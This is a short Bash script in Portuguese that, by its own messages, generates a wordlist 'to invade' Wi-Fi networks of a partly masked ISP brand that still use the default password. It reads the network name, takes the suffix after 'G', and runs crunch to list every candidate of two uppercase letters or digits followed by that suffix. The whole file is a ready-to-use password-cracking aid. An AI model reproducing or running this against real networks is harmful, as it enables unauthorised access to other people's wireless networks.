#!/bin/bash			
#script feito por Matheus Laidler (github.com/matheuslaidler)
echo "Criando Wordlist para invadir redes C***O-N3T com login PADRÃO"
echo "Digite o nome da sua rede WIFI (ex: C***O_2G40D431)"
read wifi
echo "Wordlist está sendo criada..."
sleep 1.5s
echo $wifi | cut -d "G" -f 2 > wifi.txt && crunch 8 8 ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890 -t @@$(cat wifi.txt) -o wlcl.txt &>/dev/null && rm wifi.txt
sleep 1.5s
echo "Wordlist criada com sucesso!!"
sleep 1s
echo "A wordlist foi criada e salva como 'wlcl.txt'"
sleep 1s
#echo "Abrindo wordlist..."
#echo "(Leitura de documento via 'less'. Utilize as setas, PgUp, PgDown para subir e descer; End e Home para ir ao final ou voltar ao topo; Q para fechar a visualização)"
#sleep 3s
#cat wlcl.txt | less
echo "Finalizando..."
sleep 1.5s
exit
